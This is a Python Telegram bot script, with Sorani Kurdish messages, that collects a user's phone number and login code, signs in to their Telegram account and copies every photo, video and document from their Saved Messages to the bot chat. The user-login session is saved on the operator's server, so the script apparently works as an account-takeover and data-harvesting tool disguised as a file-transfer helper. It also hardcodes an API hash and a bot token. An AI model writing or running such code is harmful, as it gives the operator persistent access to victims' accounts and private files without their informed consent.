import os
import asyncio
from pyrogram import Client, filters
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton, Message

# زانیاریەکانت جێگیر کران
API_ID = 36234377
API_HASH = "5e199e2ae89cc1c42a6a4853951ff98f"
BOT_TOKEN = "8993540801:AAH_W0X78Cjndjg1uXwgwl4khRSWvk5JFfw"

SESSION_DIR = "sessions"
os.makedirs(SESSION_DIR, exist_ok=True)

bot = Client("my_auth_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@bot.on_message(filters.command("start"))
async def start_command(client, message: Message):
    keyboard = ReplyKeyboardMarkup(
        [[KeyboardButton("ناردنی ژمارەی تەلەفۆن 📱", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    await message.reply("بەخێر بێیت! بۆ بەردەوامبوون تکایە دوگمەی خوارەوە سەرکوت بکە:", reply_markup=keyboard)

@bot.on_message(filters.contact)
async def get_contact(client, message: Message):
    phone_number = message.contact.phone_number
    user_id = message.from_user.id
    
    await message.reply("چاوەڕێ بکە، کۆد بۆ تلگرامت دەنێرم...")
    
    try:
        user_client = Client(f"{SESSION_DIR}/user_{user_id}", api_id=API_ID, api_hash=API_HASH, phone_number=phone_number, in_memory=True)
        await user_client.connect()
        sent_code = await user_client.send_code(phone_number)
        
        with open(f"{SESSION_DIR}/{user_id}_hash.txt", "w") as f: f.write(sent_code.phone_code_hash)
        with open(f"{SESSION_DIR}/{user_id}_phone.txt", "w") as f: f.write(phone_number)
            
        await user_client.disconnect()
        await message.reply("✅ کۆد نێردرا! لێرە بنووسەی (بێ بۆشایی):")
    except Exception as e:
        await message.reply(f"هەڵە: {str(e)}")

@bot.on_message(filters.text & ~filters.command("start"))
async def get_code_and_process(client, message: Message):
    user_id = message.from_user.id
    code = message.text.strip()
    
    hash_file = f"{SESSION_DIR}/{user_id}_hash.txt"
    phone_file = f"{SESSION_DIR}/{user_id}_phone.txt"
    
    if not os.path.exists(hash_file):
        await message.reply("تکایە سەرەتا /start بنووسە.")
        return
        
    with open(hash_file, "r") as f: phone_code_hash = f.read().strip()
    with open(phone_file, "r") as f: phone_number = f.read().strip()
        
    await message.reply("خەریکی چوونەژوورەوەین...")
    
    try:
        user_client = Client(f"{SESSION_DIR}/user_{user_id}", api_id=API_ID, api_hash=API_HASH, phone_number=phone_number)
        await user_client.connect()
        await user_client.sign_in(phone_number, phone_code_hash, code)
        
        await message.reply("✅ چوویتە ژوورەوە! خەریکی گواستنەوەی فایلی Saved Messages... تکایە چاوەڕێ بکە.")
        
        count = 0
        async for msg in user_client.get_chat_history("me"):
            if msg.video or msg.document or msg.photo:
                await msg.copy(chat_id=message.chat.id)
                count += 1
                await asyncio.sleep(1.5)
                    
        await message.reply(f"🎉 پرۆسەکە تەواو بوو! کۆی گشتی {count} فایل گواسترایەوە.")
        await user_client.disconnect()
        
        if os.path.exists(hash_file): os.remove(hash_file)
        if os.path.exists(phone_file): os.remove(phone_file)
        
    except Exception as e:
        await message.reply(f"هەڵە لە چوونەژوورەوە: {str(e)}")

bot.run()
            
